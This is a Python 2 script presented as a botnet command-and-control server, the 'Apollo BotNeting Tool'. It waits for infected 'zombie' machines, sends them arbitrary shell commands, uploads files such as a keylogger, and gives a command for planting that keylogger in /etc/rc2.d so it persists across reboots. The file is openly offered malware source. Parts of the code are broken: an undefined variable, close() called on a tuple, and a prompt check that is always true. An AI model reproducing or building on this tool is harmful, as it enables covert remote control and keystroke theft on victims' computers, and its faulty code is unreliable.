#!/usr/bin env python
import socket
import os
import sys
import subprocess
import commands
import ceaser


Help2 = True
weird_num = 1024
Again2 = 'Yes'
startup = "mv /home/pi/keylogger.pyw /etc/rc2.d"
print "Coded by ninjabobroberts from BoKode"
s = socket.socket()
host = socket.gethostname()
port = 12345
s.bind((host, port))
print "Botnet Server Started On ", host, "And Port # ", port
s.listen(5)
print "Listening For Zombies"
conn, addr = s.accept()
print addr, "Connected"
print "Use Nmap [target] -O to find the type of system being used."
print "Do My Bidding!"
try:
    Grunting = conn.recv(1024)
    print "Recived Packets"
except:
    print "Error Packet Not Recived"
print Grunting

def send_files():
    print "Make Sure The End Is Included. Example: keylogger.pyw"
    print "Carry The Message Zombie MailMan"
    try:
        conn.send(file_name)
    except:
        print "Something Went Wrong."
        print "Just Upload on GitHub And Type For Cmd 'git clone [GitHub Link]'"

def send_cmd():
    Help1 = True
    Cmd = raw_input("Type -h For Help Or Type quit To Quit. Enter Command: ")
    while Help1:
        if Cmd == 'quit':
            addr.close()
            s.close()
            break
        elif Cmd == '-h':
            print "This is the command that will run on the system.\nUse the Nmap scan results to find OS.\nEnter commands accordingly\nExample Windows: tree\nExample Linux/Mac OS: ls"
            print "To Move Files To Start Automaticly\n (Raspberry Pi Linux) mv home/pi/keylogger.pyw /etc/rc2.d. Replace pi with username."
            Help1 = False
        else:
            print ""

        if Help1 == True:
            print "Sending Cmd"
            conn.send(Cmd)
            print "You Tried ", Cmd

            print "Command Sent!"

            print "You Will Recive A Message If It Fails"
            try:
                Output = conn.recv(1024)
                print "Command Recived"
                print str(Output)
            except:
                print "Command Not Recived"
            Help1 = False
        else:
            print "Error, Command Not Being Sent"
send_cmd()


Again = raw_input("Do You Want To Run Another Command? y/n?")

if Again == "y":
        conn.send(Again2)
        while Help2:
            send_cmd()
else:
    FilesBool = raw_input("Do You Want To Upload Files To The Target? True or False")
    if FilesBool:
            send_files()

    else:
        print "Come Again!"

print "Thank You For Using Apollo BotNeting Tool\nHave Fun Creating A Virtual Robot Army!"


        
    
       
